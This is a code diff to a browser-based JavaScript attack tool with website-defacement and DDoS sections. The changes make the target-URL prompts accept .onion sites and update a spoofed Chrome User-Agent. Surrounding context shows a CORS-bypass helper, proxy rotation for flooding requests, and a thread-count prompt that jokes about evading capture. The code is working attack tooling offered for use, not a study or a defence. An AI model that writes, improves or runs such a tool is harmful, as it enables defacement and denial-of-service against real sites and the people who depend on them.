@@ -67,7 +67,22 @@ defaceInfo.style.fontSize = "1.1em"; // Slightly larger
 defaceInfo.style.marginBottom = "15px"; // Add margin
 defaceSection.appendChild(defaceInfo);
 
-let targetURLDeface = prompt("%cEnter target URL to deface:", "https://example.com", "color: #008000");
+let targetURLDeface;
+
+// Function to get target URL with Tor support
+const getTargetURL = async () => {
+    let url = prompt("%cEnter target URL to deface (including .onion sites):", "https://example.com", "color: #008000");
+    if (!url) {
+        alert("No URL provided. Exiting.");
+        window.close();
+        throw new Error("No URL provided. Exiting.");
+    }
+    return url;
+};
+
+(async () => {
+    targetURLDeface = await getTargetURL();
+})();
 
 // Function to bypass CORS using a proxy
 const bypassCORS = async (url) => {
@@ -265,7 +280,22 @@ ddosInfo.style.fontSize = "1.1em"; // Slightly larger
 ddosInfo.style.marginBottom = "15px"; // Add margin
 ddosSection.appendChild(ddosInfo);
 
-const targetURLDDoS = prompt("%cEnter target URL for DDoS:", "https://example.com", "color: #008000");
+// Get target URL with Tor support
+let targetURLDDoS;
+
+const getTargetURLDDoS = async () => {
+    let url = prompt("%cEnter target URL for DDoS (including .onion sites):", "https://example.com", "color: #008000");
+    if (!url) {
+        alert("No URL provided. Exiting.");
+        window.close();
+        throw new Error("No URL provided. Exiting.");
+    }
+    return url;
+};
+
+(async () => {
+    targetURLDDoS = await getTargetURLDDoS();
+})();
 
 // Input validation for threadsDDoS
 let threadsDDoS = parseInt(prompt("%cEnter number of threads (more = faster takedown, but you'll get caught faster, dumbass):", "500", "color: #008000"));
@@ -348,7 +378,7 @@ const attack = async () => {
         const proxy = getRandomProxy();
         let requestURL = targetURLDDoS;
         const headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
             'Referer': 'https://www.google.com/'
         };
 
